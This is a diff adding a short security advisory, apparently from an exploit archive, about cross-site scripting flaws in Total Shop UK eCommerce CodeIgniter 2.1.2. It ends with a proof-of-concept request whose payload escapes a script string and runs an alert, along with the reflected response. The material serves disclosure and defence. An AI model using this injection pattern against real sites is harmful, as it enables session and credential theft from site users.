@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/54985/info
+
+Total Shop UK eCommerce CodeIgniter is prone to multiple unspecified cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+CodeIgniter 2.1.2 is vulnerable; other versions may also be affected. 
+
+Example 1 Request: +----------------- GET /?%00";};alert(String.fromCharCode(120,115,115,116,101,115,116 ));{//=1 HTTP/1.1 Host: www.example.com Referer: http://www.example.com/about --- Example 1 Response: +------------------ --- SNIP --- function refresh_page(){ parent.location="/?%00";};alert(String.fromCharCode(120,115,115 ,116,101,115,116));{//=1"; 
